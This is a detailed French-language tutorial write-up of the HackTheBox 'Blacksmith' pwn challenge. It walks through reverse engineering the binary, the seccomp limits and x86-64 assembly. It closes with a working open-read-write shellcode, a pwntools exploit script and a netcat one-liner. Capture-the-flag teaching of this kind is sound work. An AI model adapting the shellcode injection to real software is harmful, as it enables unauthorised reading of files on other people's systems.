# Blacksmith - Write-up HackTheBox

![HTB Blacksmith](https://img.shields.io/badge/HackTheBox-Blacksmith-green)![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen)![Category](https://img.shields.io/badge/Category-Pwn-red)

## Résumé

| Info | Valeur |
|------|--------|
| **Flag** | `HTB{XXXXXXXXXXXXXXXXXXXXXXX}` |
| **Vulnérabilité** | Shellcode execution dans `shield()` |
| **Contrainte** | Seccomp limite les syscalls à `open`, `read`, `write`, `exit` |
| **Technique** | Shellcode "open-read-write" pour lire `flag.txt` |

---

## Table des matières

1. [Introduction pour les débutants](#introduction-pour-les-débutants)
2. [Prérequis et contraintes](#prérequis-et-contraintes)
3. [Outils nécessaires](#outils-nécessaires)
4. [Étape 1 : Reconnaissance du fichier](#étape-1--reconnaissance-du-fichier)
5. [Étape 2 : Analyse des chaînes de caractères](#étape-2--analyse-des-chaînes-de-caractères)
6. [Étape 3 : Identifier les fonctions](#étape-3--identifier-les-fonctions)
7. [Étape 4 : Désassembler le programme](#étape-4--désassembler-le-programme)
8. [Étape 5 : Trouver la vulnérabilité](#étape-5--trouver-la-vulnérabilité)
9. [Étape 6 : Comprendre les restrictions seccomp](#étape-6--comprendre-les-restrictions-seccomp)
10. [Crash Course : Assembleur x86-64](#crash-course--assembleur-x86-64-pour-les-nuls)
11. [Étape 7 : Écrire le shellcode](#étape-7--écrire-le-shellcode)
12. [Étape 8 : Debugger et corriger](#étape-8--debugger-et-corriger)
13. [Étape 9 : Exploit final](#étape-9--exploit-final)
14. [Leçons apprises](#leçons-apprises)

---

## Introduction pour les débutants

### C'est quoi un challenge "Pwn" ?

"Pwn" (prononcé "pone") signifie exploiter une vulnérabilité dans un programme pour lui faire faire quelque chose qu'il n'était pas censé faire. Dans ce challenge, on va :

1. Analyser un programme compilé (binaire)
2. Trouver une faille de sécurité
3. Écrire du code machine (shellcode) pour lire un fichier secret

### C'est quoi un shellcode ?

Un shellcode est une suite d'instructions machine (des bytes) qu'on injecte dans un programme vulnérable. Ces instructions sont exécutées directement par le processeur.

### C'est quoi seccomp ?

Seccomp (Secure Computing) est une fonctionnalité de sécurité Linux qui limite les "syscalls" (appels système) qu'un programme peut faire. Par exemple, on peut interdire à un programme d'exécuter d'autres programmes, mais lui permettre de lire des fichiers.

---

## Prérequis et contraintes

### Système d'exploitation

> **IMPORTANT** : Le binaire `blacksmith` est un exécutable **Linux x86-64**. Il ne peut PAS s'exécuter directement sur :
> - **macOS** (même avec un Mac Intel)
> - **Windows** (sauf avec WSL)
> - **Linux ARM** (comme Raspberry Pi)

### Solutions pour exécuter le binaire

| Si tu es sur... | Solution |
|-----------------|----------|
| **macOS** | Utiliser Docker avec `--platform linux/amd64`, ou une VM Linux, ou un serveur Linux distant via SSH |
| **Windows** | Utiliser WSL2 (Windows Subsystem for Linux) ou une VM |
| **Linux ARM** | Utiliser QEMU ou une VM x86-64 |
| **Linux x86-64** | Tu peux exécuter directement |

### Pour ce writeup

On utilise :
- **Machine locale** (macOS) : pour l'analyse statique (`file`, `strings`, `nm`, `objdump`)
- **Machine distante Linux x86-64** (via SSH) : pour exécuter et tester l'exploit
- **Serveur HTB** : pour récupérer le vrai flag

---

## Outils nécessaires

### Installation

```bash
# Sur Ubuntu/Debian
sudo apt update
sudo apt install binutils file strace netcat

# Python et pwntools (pour l'exploit)
pip3 install pwntools
```

### Explication détaillée de chaque outil

#### `file` - Identifier le type de fichier

**C'est quoi ?** Une commande qui analyse les premiers bytes d'un fichier pour déterminer son type (exécutable, image, texte, etc.).

**Pourquoi c'est utile ?** Avant d'analyser un fichier, tu dois savoir à quoi tu as affaire. Un `.exe` Windows ne s'analyse pas comme un binaire Linux.

```bash
file blacksmith
# Résultat : ELF 64-bit LSB pie executable, x86-64...
```

---

#### `strings` - Extraire les chaînes de caractères

**C'est quoi ?** Une commande qui parcourt un fichier binaire et affiche toutes les séquences de caractères lisibles (lettres, chiffres) d'au moins 4 caractères.

**Pourquoi c'est utile ?** Les programmes contiennent souvent des messages d'erreur, des noms de fonctions, des URLs, des chemins de fichiers... Ça donne des indices sur ce que fait le programme.

```bash
strings blacksmith | head -20
# Affiche les 20 premières chaînes trouvées
```

---

#### `nm` - Lister les symboles d'un binaire

**C'est quoi ?** `nm` (pour "name list") est une commande qui affiche la **table des symboles** d'un fichier binaire. Les symboles incluent :
- Les noms des **fonctions** définies dans le programme
- Les noms des **variables globales**
- Les références aux **fonctions externes** (bibliothèques)

**Pourquoi c'est utile ?** Ça te donne une "carte" du programme : quelles fonctions existent, où elles sont situées en mémoire.

**Format de sortie :**
```
ADRESSE TYPE NOM
```

**Les types importants :**
| Type | Signification |
|------|---------------|
| `T` | Fonction définie dans le programme (Text section) |
| `U` | Fonction externe non définie (importée d'une bibliothèque) |
| `D` | Variable globale initialisée (Data section) |
| `B` | Variable globale non initialisée (BSS section) |

```bash
nm blacksmith | grep " T "
# Affiche uniquement les fonctions définies dans le programme
```

---

#### `objdump` - Désassembler le code machine

**C'est quoi ?** Un outil qui convertit le code machine (bytes) en instructions assembleur lisibles. C'est l'inverse de ce que fait un compilateur.

**Pourquoi c'est utile ?** Pour comprendre exactement ce que fait chaque fonction du programme, instruction par instruction.

```bash
objdump -d -M intel blacksmith | grep -A 50 "<main>:"
```

**Options importantes :**
| Option | Effet |
|--------|-------|
| `-d` | Désassembler les sections de code |
| `-M intel` | Utiliser la syntaxe Intel (plus lisible que AT&T) |
| `grep -A 50 "<main>:"` | Afficher 50 lignes après le début de la fonction `main` |

---

#### `strace` - Tracer les appels système

**C'est quoi ?** Un outil qui intercepte et affiche tous les **syscalls** (appels système) faits par un programme : ouverture de fichiers, lecture/écriture, allocation mémoire, etc.

**Pourquoi c'est utile ?** Pour debugger un exploit et voir exactement ce qui se passe quand le shellcode s'exécute. Si un syscall échoue, `strace` te montre l'erreur.

```bash
strace ./blacksmith
# Affiche tous les syscalls en temps réel
```

> **Note** : `strace` est uniquement disponible sur Linux.

---

#### `pwntools` - Bibliothèque Python d'exploitation

**C'est quoi ?** Une bibliothèque Python spécialement conçue pour le CTF et l'exploitation de binaires. Elle permet de :
- Se connecter à des services distants (`remote()`)
- Lancer des processus locaux (`process()`)
- Envoyer/recevoir des données facilement
- Assembler du shellcode
- Et bien plus...

```python
from pwn import *

# Connexion à un serveur
p = remote('127.0.0.1', 1337)

# Envoyer des données
p.sendline(b'hello')

# Recevoir jusqu'à un pattern
p.recvuntil(b'password:')
```

---

## Étape 1 : Reconnaissance du fichier

### Commande

```bash
file blacksmith
```

### Résultat

```
blacksmith: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV),
dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2,
for GNU/Linux 3.2.0, not stripped
```

### Explication détaillée

| Terme | Signification |
|-------|---------------|
| **ELF** | Format de fichier exécutable pour Linux (comme .exe pour Windows) |
| **64-bit** | Programme pour processeur 64 bits |
| **LSB** | Little-endian (l'ordre des bytes, on y reviendra) |
| **pie executable** | Position Independent Executable (le code peut être chargé n'importe où en mémoire) |
| **x86-64** | Architecture du processeur (Intel/AMD 64 bits) |
| **dynamically linked** | Utilise des bibliothèques externes (.so) |
| **not stripped** | Les noms des fonctions sont conservés (facilite l'analyse) |

**Point clé** : "not stripped" est une bonne nouvelle ! On pourra voir les noms des fonctions comme `main`, `shield`, etc.

---

## Étape 2 : Analyse des chaînes de caractères

### Rappel : c'est quoi `strings` ?

`strings` parcourt un fichier binaire et extrait toutes les séquences de caractères imprimables (lettres, chiffres, ponctuation) d'au moins 4 caractères par défaut.

### Commande

```bash
strings blacksmith | head -50
```

**Décomposition :**
- `strings blacksmith` : extrait toutes les chaînes du binaire
- `| head -50` : n'affiche que les 50 premières lignes (sinon c'est trop long)

**Variantes utiles :**
```bash
strings blacksmith | grep -i flag    # Chercher "flag" (insensible à la casse)
strings blacksmith | grep -i password # Chercher des mots de passe
strings -n 10 blacksmith             # Chaînes d'au moins 10 caractères
```

### Résultat (extraits importants)

```
libseccomp.so.2          <- Utilise la bibliothèque seccomp
seccomp_load
seccomp_rule_add
seccomp_init
__isoc99_scanf           <- Lit l'entrée utilisateur
read
write
This sword can cut through anything!
This bow's range is the best!
Excellent choice! This luminous shield is empowered with Sun's light!
What do you want me to craft?
1. Yes, everything is here!
2. No, I did not manage to bring them all!
```

### Ce qu'on apprend

1. **Le programme utilise seccomp** → Il y aura des restrictions sur ce qu'on peut faire
2. **Il y a un menu** avec des choix (sword, bow, shield)
3. **Il utilise scanf/read** → Il lit notre entrée (potentielle vulnérabilité)

---

## Étape 3 : Identifier les fonctions

### Rappel : c'est quoi `nm` ?

`nm` affiche la **table des symboles** d'un binaire. Cette table contient les noms et adresses de toutes les fonctions et variables du programme.

> **Note** : Si le binaire est "stripped" (symboles supprimés), `nm` ne montrera rien d'utile. Heureusement, ce binaire est "not stripped" (on l'a vu avec `file`).

### Commande

```bash
nm blacksmith | grep " T "
```

**Décomposition de la commande :**
- `nm blacksmith` : liste tous les symboles du binaire
- `| grep " T "` : filtre pour ne garder que les lignes contenant ` T ` (espace-T-espace)

**Pourquoi ` T ` ?** Le `T` (majuscule) indique une fonction définie dans la section "Text" du programme, c'est-à-dire une fonction qui fait partie du code du programme (pas importée d'une bibliothèque).

### Résultat

```
0000000000000cfd T bow
0000000000000dfb T main
0000000000000bb4 T sec
0000000000000b4a T setup
0000000000000d56 T shield
0000000000000ca4 T sword
```

### Comment lire ce résultat ?

```
0000000000000cfd T bow
│                │ │
│                │ └── Nom de la fonction
│                └──── Type (T = fonction dans le code)
└─────────────────────  Adresse en mémoire (hexadécimal)
```

### Analyse des fonctions trouvées

| Fonction | Adresse | Rôle probable (basé sur le nom) |
|----------|---------|--------------------------------|
| `main` | 0xdfb | Point d'entrée du programme |
| `setup` | 0xb4a | Initialisation (probablement configure stdin/stdout) |
| `sec` | 0xbb4 | "Security" - Configuration de seccomp |
| `sword` | 0xca4 | Gère le choix "épée" du menu |
| `bow` | 0xcfd | Gère le choix "arc" du menu |
| `shield` | 0xd56 | Gère le choix "bouclier" du menu |

**Observation importante** : Les fonctions `sword`, `bow`, `shield` correspondent aux 3 choix du menu qu'on a vu dans les strings. Une de ces fonctions contient probablement la vulnérabilité.

---

## Étape 4 : Désassembler le programme

### C'est quoi le désassemblage ?

Quand tu écris du code en C, il est compilé en instructions machine (des bytes). Le désassemblage fait l'inverse : il convertit les bytes en instructions lisibles (assembleur).

### Commande pour voir la fonction main

```bash
objdump -d -M intel blacksmith | grep -A 80 "<main>:"
```

- `-d` : désassembler
- `-M intel` : utiliser la syntaxe Intel (plus lisible)

### Analyse simplifiée du main

```asm
main:
    call setup              ; Initialise le programme

    ; Affiche "Do you have the materials?"
    ; Lit notre réponse avec scanf

    cmp eax, 0x1            ; Compare notre réponse avec 1
    jne exit                ; Si != 1, quitter

    ; Affiche "What do you want me to craft?"
    ; Lit notre choix (1, 2 ou 3)

    call sec                ; Active les restrictions seccomp !

    cmp eax, 0x1
    je sword                ; Si 1, appeler sword()
    cmp eax, 0x2
    je shield               ; Si 2, appeler shield()
    cmp eax, 0x3
    je bow                  ; Si 3, appeler bow()
```

### Point crucial

**`sec()` est appelé AVANT les fonctions sword/bow/shield.** Cela signifie que quand notre code s'exécute, seccomp est déjà actif.

---

## Étape 5 : Trouver la vulnérabilité

### Désassemblage de shield()

```bash
objdump -d -M intel blacksmith | grep -A 50 "<shield>:"
```

### Code assembleur annoté

```asm
shield:
    ; ... initialisation ...

    ; Affiche les messages sur le bouclier
    call write

    ; VOICI LA VULNÉRABILITÉ :
    lea rax, [rbp - 0x50]     ; rax = adresse d'un buffer sur la stack
    mov edx, 0x3f             ; 0x3f = 63 en décimal
    mov rsi, rax              ; rsi = buffer
    mov edi, 0x0              ; edi = 0 = stdin
    call read                 ; read(stdin, buffer, 63)

    lea rdx, [rbp - 0x50]     ; rdx = adresse du buffer
    call rdx                  ; EXÉCUTE LE CONTENU DU BUFFER !
```

### Explication de la vulnérabilité

```
┌─────────────────────────────────────────────────────────┐
│                    CE QUI SE PASSE                      │
├─────────────────────────────────────────────────────────┤
│  1. Le programme lit 63 bytes de notre entrée           │
│  2. Il stocke ces bytes dans un buffer                  │
│  3. Il EXÉCUTE ce buffer comme du code !                │
│                                                         │
│  C'est comme si le programme nous disait :              │
│  "Donne-moi des instructions et je les exécute"         │
└─────────────────────────────────────────────────────────┘
```

**C'est une vulnérabilité de type "shellcode execution"** : on peut injecter du code machine arbitraire et il sera exécuté.

### Contrainte

On a seulement **63 bytes** pour notre shellcode. C'est peu, il faudra être efficace.

---

## Étape 6 : Comprendre les restrictions seccomp

### Désassemblage de sec()

```bash
objdump -d -M intel blacksmith | grep -A 80 "<sec>:"
```

### Analyse des règles seccomp

```asm
sec:
    ; seccomp_init(SCMP_ACT_KILL)
    ; Par défaut, TOUS les syscalls sont interdits (kill le programme)

    ; seccomp_rule_add(..., ALLOW, 2, ...)   <- syscall 2 = open
    ; seccomp_rule_add(..., ALLOW, 0, ...)   <- syscall 0 = read
    ; seccomp_rule_add(..., ALLOW, 1, ...)   <- syscall 1 = write
    ; seccomp_rule_add(..., ALLOW, 60, ...)  <- syscall 60 = exit

    ; seccomp_load() - Active les règles
```

### Syscalls autorisés

| Numéro | Nom | Description |
|--------|-----|-------------|
| 0 | `read` | Lire depuis un fichier/socket |
| 1 | `write` | Écrire vers un fichier/socket |
| 2 | `open` | Ouvrir un fichier |
| 60 | `exit` | Terminer le programme |

### Ce qu'on NE PEUT PAS faire

- `execve` (numéro 59) → Impossible de lancer `/bin/sh`
- `mmap`, `mprotect` → Impossible de modifier les permissions mémoire

### Notre stratégie : Open-Read-Write

Puisqu'on peut faire `open`, `read` et `write`, on va :

```
1. open("flag.txt")  → Obtenir un file descriptor (fd)
2. read(fd, buffer)  → Lire le contenu du flag
3. write(stdout, buffer) → Afficher le flag
```

---

## Crash Course : Assembleur x86-64 pour les nuls

> **Pas de panique !** Tu n'as pas besoin de tout comprendre pour résoudre ce challenge. Cette section t'explique juste les bases pour comprendre le shellcode qu'on va écrire.

### C'est quoi l'assembleur ?

L'assembleur est le langage le plus proche du processeur. Chaque instruction correspond à une opération simple que le CPU sait faire : déplacer une valeur, additionner, comparer, etc.

```
Code C           →  Compilateur  →  Assembleur      →  Code machine (bytes)
int x = 5;                          mov eax, 5          B8 05 00 00 00
```

### Les registres : la mémoire ultra-rapide du CPU

Les registres sont des petites cases mémoire **à l'intérieur** du processeur. C'est là que se font tous les calculs.

**Les registres généraux en x86-64 :**

```
┌─────────────────────────────────────────────────────────────┐
│  64 bits (8 bytes)                                          │
│  ┌────────────────────────────────────────────────────────┐ │
│  │                        RAX                             │ │  ← Registre complet
│  └────────────────────────────────────────────────────────┘ │
│                                  ┌────────────────────────┐ │
│                                  │         EAX            │ │  ← 32 bits bas
│                                  └────────────────────────┘ │
│                                              ┌────────────┐ │
│                                              │     AX     │ │  ← 16 bits bas
│                                              └────────────┘ │
│                                              ┌─────┬──────┐ │
│                                              │ AH  │  AL  │ │  ← 8 bits (haut/bas)
│                                              └─────┴──────┘ │
└─────────────────────────────────────────────────────────────┘
```

**Liste des registres principaux :**

| 64-bit | 32-bit | 16-bit | 8-bit | Usage courant |
|--------|--------|--------|-------|---------------|
| `rax` | `eax` | `ax` | `al` | Valeur de retour, calculs |
| `rbx` | `ebx` | `bx` | `bl` | Usage général |
| `rcx` | `ecx` | `cx` | `cl` | Compteur de boucles |
| `rdx` | `edx` | `dx` | `dl` | Données, 3ème argument syscall |
| `rsi` | `esi` | `si` | `sil` | Source, 2ème argument syscall |
| `rdi` | `edi` | `di` | `dil` | Destination, 1er argument syscall |
| `rsp` | `esp` | `sp` | `spl` | Pointeur de pile (stack) |
| `rbp` | `ebp` | `bp` | `bpl` | Base de la pile |

### Les instructions de base

#### `mov` - Déplacer/Copier une valeur

```asm
mov rax, 5          ; rax = 5
mov rax, rbx        ; rax = rbx (copie rbx dans rax)
mov rax, [rbx]      ; rax = valeur à l'adresse pointée par rbx
mov al, 5           ; ATTENTION: ne modifie QUE le byte bas de rax !
```

#### `xor` - OU exclusif (utilisé pour mettre à zéro)

```asm
xor eax, eax        ; eax = 0 (n'importe quelle valeur XOR elle-même = 0)
                    ; Plus court que "mov eax, 0" (2 bytes vs 5 bytes)
```

**Pourquoi `xor eax, eax` au lieu de `mov eax, 0` ?**
- `xor eax, eax` = 2 bytes
- `mov eax, 0` = 5 bytes
- En shellcode, chaque byte compte !

#### `push` et `pop` - Manipuler la pile (stack)

La pile est une zone mémoire qui fonctionne comme une pile d'assiettes : on pose dessus (push) et on retire du dessus (pop).

```asm
push rax            ; Met rax sur la pile, rsp diminue de 8
pop rbx             ; Retire le sommet de la pile dans rbx, rsp augmente de 8

push 0x41           ; Met la valeur 0x41 sur la pile
```

**Schéma de la pile :**

```
Avant push rax:          Après push rax:
                         ┌─────────────┐
                         │ valeur rax  │ ← rsp (nouveau sommet)
┌─────────────┐          ├─────────────┤
│   données   │ ← rsp    │   données   │
├─────────────┤          ├─────────────┤
│     ...     │          │     ...     │
└─────────────┘          └─────────────┘
```

#### `syscall` - Appeler le système d'exploitation

```asm
syscall             ; Exécute l'appel système
                    ; Le numéro du syscall doit être dans rax
                    ; Les arguments dans rdi, rsi, rdx, r10, r8, r9
                    ; Le résultat est retourné dans rax
```

#### `xchg` - Échanger deux valeurs

```asm
xchg eax, edi       ; Échange les valeurs de eax et edi
                    ; Équivalent à : tmp=eax; eax=edi; edi=tmp
                    ; Mais en 1 seul byte !
```

#### `lea` - Charger une adresse

```asm
lea rax, [rbp-0x50] ; rax = adresse de (rbp - 0x50)
                    ; NE lit PAS la mémoire, juste calcule l'adresse
```

#### `sub` et `add` - Soustraction et addition

```asm
sub rsp, 80         ; rsp = rsp - 80 (réserve 80 bytes sur la pile)
add rax, 5          ; rax = rax + 5
```

#### `cmp` et `je/jne` - Comparer et sauter

```asm
cmp eax, 1          ; Compare eax avec 1 (eax - 1, sans stocker le résultat)
je label            ; Jump if Equal : saute à "label" si eax == 1
jne label           ; Jump if Not Equal : saute si eax != 1
```

### Résumé des instructions utilisées dans notre shellcode

| Instruction | Effet | Exemple |
|-------------|-------|---------|
| `xor eax, eax` | Met eax à 0 | Réinitialiser un registre |
| `push rax` | Empile rax | Mettre une valeur sur la stack |
| `pop rdi` | Dépile dans rdi | Récupérer une valeur |
| `mov al, 2` | Met 2 dans le byte bas de rax | Numéro de syscall |
| `syscall` | Appel système | Exécuter open/read/write |
| `xchg edi, eax` | Échange edi et eax | Transférer le résultat |
| `sub rsp, 80` | Réserve 80 bytes | Créer un buffer |

### Ressources pour apprendre l'assembleur

> **Liens accessibles, pas de documentation hardcore !**

| Ressource | Description | Lien |
|-----------|-------------|------|
| **x86-64 Assembly Tutorial** | Tutoriel interactif pour débutants | [cs.lmu.edu/~ray/notes/x86assembly](https://cs.lmu.edu/~ray/notes/x86assembly/) |
| **Compiler Explorer** | Tape du C, vois l'assembleur généré en direct | [godbolt.org](https://godbolt.org/) |
| **Syscall Table** | Liste de tous les syscalls Linux x86-64 | [syscalls.w3challs.com](https://syscalls.w3challs.com/?arch=x86_64) |
| **Shell-storm Shellcodes** | Base de données de shellcodes existants | [shell-storm.org/shellcode](http://shell-storm.org/shellcode/) |
| **x64 Cheat Sheet** | Résumé PDF d'une page | [cs.brown.edu/courses/cs033/docs/guides/x64_cheatsheet.pdf](https://cs.brown.edu/courses/cs033/docs/guides/x64_cheatsheet.pdf) |
| **Nightmare** | Cours CTF/Pwn complet et gratuit | [guyinatuxedo.github.io](https://guyinatuxedo.github.io/) |
| **pwn.college** | Cours interactif Arizona State University | [pwn.college](https://pwn.college/) |

### Le piège classique : `mov al` vs `xor eax + mov al`

C'est LE bug qu'on a rencontré dans ce challenge :

```asm
;  FAUX - Si rax contenait 0x7478742e67616c66 ("flag.txt")
mov al, 2           ; rax = 0x7478742e67616c02  (seul le byte bas change !)

;  CORRECT
xor eax, eax        ; rax = 0x0000000000000000
mov al, 2           ; rax = 0x0000000000000002
```

**Règle d'or** : Toujours `xor eax, eax` avant `mov al, N` si tu veux que rax soit exactement N.

---

## Étape 7 : Écrire le shellcode

### Introduction aux syscalls Linux x86-64

Pour faire un syscall en assembleur x86-64 :

```asm
; Les arguments vont dans ces registres :
; rax = numéro du syscall
; rdi = 1er argument
; rsi = 2ème argument
; rdx = 3ème argument
; r10 = 4ème argument
; r8  = 5ème argument
; r9  = 6ème argument

syscall    ; Exécute le syscall, résultat dans rax
```

### Notre shellcode en assembleur

```asm
; ============================================
; ÉTAPE 1 : open("flag.txt", O_RDONLY)
; ============================================

xor eax, eax              ; rax = 0
push rax                  ; Push 0 (null terminator pour la string)

; Mettre "flag.txt" sur la stack
; En little-endian : "flag.txt" = 0x7478742e67616c66
mov rax, 0x7478742e67616c66
push rax                  ; Stack: "flag.txt\0"

push rsp
pop rdi                   ; rdi = pointeur vers "flag.txt"

xor esi, esi              ; rsi = 0 = O_RDONLY (lecture seule)

xor eax, eax              ; IMPORTANT : remettre rax à 0
mov al, 2                 ; rax = 2 (syscall open)
syscall                   ; Appel système, fd retourné dans rax

; ============================================
; ÉTAPE 2 : read(fd, buffer, 80)
; ============================================

xchg edi, eax             ; rdi = fd (retour de open)

sub rsp, 80               ; Réserver 80 bytes sur la stack
push rsp
pop rsi                   ; rsi = adresse du buffer

push 80
pop rdx                   ; rdx = 80 (nombre de bytes à lire)

xor eax, eax              ; rax = 0 (syscall read)
syscall                   ; Lire le fichier

; ============================================
; ÉTAPE 3 : write(1, buffer, bytes_read)
; ============================================

xchg edx, eax             ; rdx = nombre de bytes lus

push 1
pop rdi                   ; rdi = 1 (stdout)

xor eax, eax              ; rax = 0
mov al, 1                 ; rax = 1 (syscall write)
syscall                   ; Afficher le contenu

; ============================================
; ÉTAPE 4 : exit(0)
; ============================================

xor edi, edi              ; rdi = 0 (code de sortie)
xor eax, eax
mov al, 60                ; rax = 60 (syscall exit)
syscall
```

### Explication du little-endian

Les processeurs x86 stockent les nombres avec l'octet de poids faible en premier.

```
"flag.txt" en ASCII : 66 6c 61 67 2e 74 78 74
                      f  l  a  g  .  t  x  t

En mémoire (little-endian), pour mettre dans un registre 64 bits :
0x7478742e67616c66
  t x t . g a l f  (lu à l'envers)

Quand on push cette valeur, elle est stockée dans le bon ordre en mémoire.
```

---

## Étape 8 : Debugger et corriger

### Le bug initial

Notre premier shellcode ne fonctionnait pas. Avec `strace`, on a vu :

```
syscall_0x67616c02(...)
```

Le numéro de syscall était `0x67616c02` au lieu de `2` !

### Explication du bug

```asm
mov rax, 0x7478742e67616c66   ; rax = "flag.txt"
push rax
; ... plus tard ...
mov al, 2                     ; Change SEULEMENT le byte bas de rax !
```

Après `mov al, 2` :
- **Attendu** : rax = 0x0000000000000002
- **Réel** : rax = 0x7478742e67616c**02** (les autres bytes n'ont pas changé !)

### La correction

```asm
xor eax, eax    ; Remet TOUS les bits de rax à 0
mov al, 2       ; Maintenant rax = 2
```

**Règle importante** : Toujours utiliser `xor eax, eax` avant `mov al, N` pour s'assurer que les bits hauts sont à zéro.

---

## Étape 9 : Exploit final

### Le shellcode corrigé (en bytes)

```python
shellcode = bytes([
    # --- OPEN("flag.txt") ---
    0x31, 0xc0,                               # xor eax, eax
    0x50,                                     # push rax (null)
    0x48, 0xb8,                               # movabs rax, "flag.txt"
    0x66, 0x6c, 0x61, 0x67, 0x2e, 0x74, 0x78, 0x74,
    0x50,                                     # push rax
    0x54,                                     # push rsp
    0x5f,                                     # pop rdi
    0x31, 0xf6,                               # xor esi, esi
    0x31, 0xc0,                               # xor eax, eax  <- FIX
    0xb0, 0x02,                               # mov al, 2
    0x0f, 0x05,                               # syscall

    # --- READ ---
    0x97,                                     # xchg edi, eax
    0x48, 0x83, 0xec, 0x50,                   # sub rsp, 80
    0x54,                                     # push rsp
    0x5e,                                     # pop rsi
    0x6a, 0x50,                               # push 80
    0x5a,                                     # pop rdx
    0x31, 0xc0,                               # xor eax, eax
    0x0f, 0x05,                               # syscall

    # --- WRITE ---
    0x92,                                     # xchg edx, eax
    0x6a, 0x01,                               # push 1
    0x5f,                                     # pop rdi
    0x31, 0xc0,                               # xor eax, eax  <- FIX
    0xb0, 0x01,                               # mov al, 1
    0x0f, 0x05,                               # syscall

    # --- EXIT ---
    0x31, 0xff,                               # xor edi, edi
    0x31, 0xc0,                               # xor eax, eax  <- FIX
    0xb0, 0x3c,                               # mov al, 60
    0x0f, 0x05,                               # syscall
])
```

**Taille totale : 56 bytes** (< 63, ça passe !)

### Script d'exploitation complet

```python
#!/usr/bin/env python3
from pwn import *

# Shellcode open-read-write
shellcode = bytes([
    0x31, 0xc0, 0x50, 0x48, 0xb8,
    0x66, 0x6c, 0x61, 0x67, 0x2e, 0x74, 0x78, 0x74,
    0x50, 0x54, 0x5f, 0x31, 0xf6, 0x31, 0xc0, 0xb0, 0x02, 0x0f, 0x05,
    0x97, 0x48, 0x83, 0xec, 0x50, 0x54, 0x5e, 0x6a, 0x50, 0x5a,
    0x31, 0xc0, 0x0f, 0x05,
    0x92, 0x6a, 0x01, 0x5f, 0x31, 0xc0, 0xb0, 0x01, 0x0f, 0x05,
    0x31, 0xff, 0x31, 0xc0, 0xb0, 0x3c, 0x0f, 0x05,
])

# Connexion au serveur
p = remote('IP_DU_SERVEUR', PORT)

# Navigation dans le menu
p.recvuntil(b'materials!')
p.sendline(b'1')          # Oui, j'ai les matériaux

p.recvuntil(b'craft?')
p.sendline(b'2')          # Je choisis le shield

# Envoi du shellcode
p.recvuntil(b'weapon?')
p.send(shellcode)

# Réception du flag
print(p.recvall(timeout=3).decode())
```

### Exécution avec netcat (alternative simple)

```bash
# Créer le fichier payload.bin avec le shellcode
python3 -c "
import sys
sys.stdout.buffer.write(bytes([
    0x31, 0xc0, 0x50, 0x48, 0xb8,
    0x66, 0x6c, 0x61, 0x67, 0x2e, 0x74, 0x78, 0x74,
    0x50, 0x54, 0x5f, 0x31, 0xf6, 0x31, 0xc0, 0xb0, 0x02, 0x0f, 0x05,
    0x97, 0x48, 0x83, 0xec, 0x50, 0x54, 0x5e, 0x6a, 0x50, 0x5a,
    0x31, 0xc0, 0x0f, 0x05,
    0x92, 0x6a, 0x01, 0x5f, 0x31, 0xc0, 0xb0, 0x01, 0x0f, 0x05,
    0x31, 0xff, 0x31, 0xc0, 0xb0, 0x3c, 0x0f, 0x05,
]))
" > payload.bin

# Exploiter
(echo "1"; sleep 0.2; echo "2"; sleep 0.2; cat payload.bin) | nc IP PORT
```

### Résultat

```
Traveler, I need some materials to fuse in order to create something really powerful!
Do you have the materials I need to craft the Ultimate Weapon?
1. Yes, everything is here!
2. No, I did not manage to bring them all!
> What do you want me to craft?
1. 🗡
2. 🛡
3. 🏹
> Excellent choice! This luminous shield is empowered with Sun's light! ☀
It will protect you from any attack and it can reflect enemies attacks back!
Do you like your new weapon?
> HTB{XXXXXXXXXXXXXXXXXXXXXXX}
```

---

## Leçons apprises

### 1. Méthodologie d'analyse

```
file → strings → nm → objdump → identifier la vuln → comprendre les contraintes → exploiter
```

### 2. Vulnérabilité shellcode execution

Quand un programme exécute directement l'entrée utilisateur comme du code, c'est une faille critique.

### 3. Seccomp n'est pas invincible

Même avec des restrictions seccomp, si on peut faire `open/read/write`, on peut lire des fichiers sensibles.

### 4. Bug classique : mov al ne remet pas rax à zéro

```asm
; FAUX (si rax contenait autre chose avant)
mov al, 2

; CORRECT
xor eax, eax
mov al, 2
```

### 5. Outils de debug

- `strace` montre les syscalls réels effectués
- Indispensable pour comprendre pourquoi un exploit ne marche pas

---

## Ressources pour aller plus loin

- [Syscall table x86-64](https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/)
- [Introduction à pwntools](https://docs.pwntools.com/en/stable/)
- [Seccomp documentation](https://man7.org/linux/man-pages/man2/seccomp.2.html)
- [Shell-storm shellcode database](http://shell-storm.org/shellcode/)

---

## Fichiers

- `exploit.py` - Script d'exploitation Python
- `payload.bin` - Shellcode compilé (56 bytes)
- `blacksmith` - Binaire du challenge

---

